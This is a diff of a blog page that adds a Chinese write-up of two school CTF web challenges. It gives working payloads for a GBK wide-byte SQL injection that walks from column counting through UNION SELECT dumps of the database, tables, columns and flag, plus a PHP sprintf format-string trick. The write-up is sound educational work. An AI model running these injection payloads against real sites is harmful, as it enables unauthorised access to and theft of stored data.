@@ -115,7 +115,18 @@
 <meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190604225147.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190604225320.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190604225419.png">
-<meta property="og:updated_time" content="2019-06-04T15:01:47.211Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205603.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205634.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205728.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205914.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210132.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210239.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210654.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210937.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605211114.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605211355.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605212235.png">
+<meta property="og:updated_time" content="2019-06-05T13:23:34.032Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SKCTF-5-25wp">
 <meta name="twitter:description" content="快乐校赛">
@@ -391,12 +402,24 @@
                 
               
 
-              <time title="创建时间：2019-06-04 21:45:37 / 修改时间：23:01:47" itemprop="dateCreated datePublished" datetime="2019-06-04T21:45:37+08:00">2019-06-04</time>
+              <time title="创建时间：2019-06-04 21:45:37" itemprop="dateCreated datePublished" datetime="2019-06-04T21:45:37+08:00">2019-06-04</time>
             
 
             
               
 
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-06-05 21:23:34" itemprop="dateModified" datetime="2019-06-05T21:23:34+08:00">2019-06-05</time>
               
             
           </span>
@@ -462,6 +485,52 @@
 <p><a href="http://www.vuln.cn/8395" target="_blank" rel="noopener">浅析一句话后门中eval与assert执行条件与原理</a></p>
 <p><a href="https://yq.aliyun.com/articles/27402" target="_blank" rel="noopener">php中assert方法的安全问题</a></p>
 <p><a href="https://www.php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">PHP assert() Manual (官方文档)</a></p>
+<h3 id="学生信息查询"><a href="#学生信息查询" class="headerlink" title="学生信息查询"></a>学生信息查询</h3><p><a href="http://47.103.6.99:8003/" target="_blank" rel="noopener">题目复现地址</a></p>
+<p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205603.png" alt></p>
+<p>?id=1查询，得到</p>
+<p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205634.png" alt></p>
+<p>?id=1’查询，得到</p>
+<p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205728.png" alt></p>
+<p>可以看到单引号被转义掉了。</p>
+<p>想到宽字节注入，试一下：</p>
+<pre><code>?id=1%df%27
+</code></pre><p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605205914.png" alt><br>报错了，说明猜想正确，开始进行注入。</p>
+<pre><code>?id=1%df%27%20order%20by%201%20%23
+</code></pre><p>正常回显。</p>
+<p>直到</p>
+<pre><code>?id=1%df%27%20order%20by%204%20%23
+</code></pre><p>报错：<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210132.png" alt></p>
+<p>说明有三个字段。接着爆库</p>
+<pre><code>?id=-1%df%27%20union%20select%201,2,database()%20%23
+</code></pre><p>P.S  这里查询的id=-1是因为-1代表不存在的数据，不会有任何回显，这样就可以看到后面联合查询出来的内容。<br>得<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210239.png" alt></p>
+<p>然后爆表</p>
+<pre><code>?id=-1%df%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema%20=%20database()%20%23
+</code></pre><p>这里库名用database()的原因是过滤了单引号，可以用该函数或者转换为16进制来进行绕过。</p>
+<p>得到<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210654.png" alt></p>
+<p>然后爆字段</p>
+<pre><code>?id=-1%df%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name%20=%200x666c6167%20--+
+</code></pre><p>这里的0x666c6167即为flag的16进制。</p>
+<p>得到<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605210937.png" alt><br>只有一个叫做flag的字段。所以直接查询：</p>
+<pre><code>?id=-1%df%27%20union%20select%201,2,flag%20from%20flag%20--+
+</code></pre><p>得到flag。<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605211114.png" alt></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>gbk编码的宽字节注入</li>
+<li>查询参数值-1</li>
+<li>过滤单引号使用16进制绕过</li>
+</ul>
+<h3 id="I-am-looking-at-you"><a href="#I-am-looking-at-you" class="headerlink" title="I am looking at you"></a>I am looking at you</h3><p><a href="http://47.103.6.99:8006/" target="_blank" rel="noopener">题目复现地址</a></p>
+<p>一道代码审计题目。</p>
+<p><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605211355.png" alt></p>
+<p>看完代码之后，可以看到关键点在于sprintf函数。那么它的作用是什么呢？</p>
+<p>类似于c语言里的sprintf，把百分号（%）符号替换成一个作为参数进行传递的变量。如题目中的用法：</p>
+<pre><code>sprintf($data,$_v);
+</code></pre><p>data变量的初始值为“I am looking at you %s”，其中的%s在sprintf函数中作为占位符传入后面的$_v函数的值。</p>
+<p>脱离出welcome函数，$arr变量是$_GET[‘myname’]和$flag组成的一个数组。显然flag变量的值就是我们需要的flag。之后调用welcome函数对arr变量进行操作，而welcome函数中会对该数组遍历，执行</p>
+<pre><code>$data = sprintf($data,$_v); 
+</code></pre><p>这一操作。</p>
+<p>想到可以在我们能够控制的变量myname中放入一个%s，这样经过第一次便利后data变量还是有一个%s，再经历一次sprintf函数就会将在后面的flag变量的值输出出来。所以构造payload：</p>
+<pre><code>?myname=cxk%s
+</code></pre><p>得到flag：<br><img src="https://raw.githubusercontent.com/Snatsu/figurebed/master/img/20190605212235.png" alt></p>
 
       
     </div>
@@ -710,7 +779,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一个不能按的按钮"><span class="nav-number">1.0.1.</span> <span class="nav-text">一个不能按的按钮</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#附"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">附</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number">1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#一个不能按的按钮"><span class="nav-number">1.0.1.</span> <span class="nav-text">一个不能按的按钮</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#附"><span class="nav-number">1.0.1.1.</span> <span class="nav-text">附</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#学生信息查询"><span class="nav-number">1.0.2.</span> <span class="nav-text">学生信息查询</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#总结"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#I-am-looking-at-you"><span class="nav-number">1.0.3.</span> <span class="nav-text">I am looking at you</span></a></li></ol></li></ol></div>
             
 
           </div>
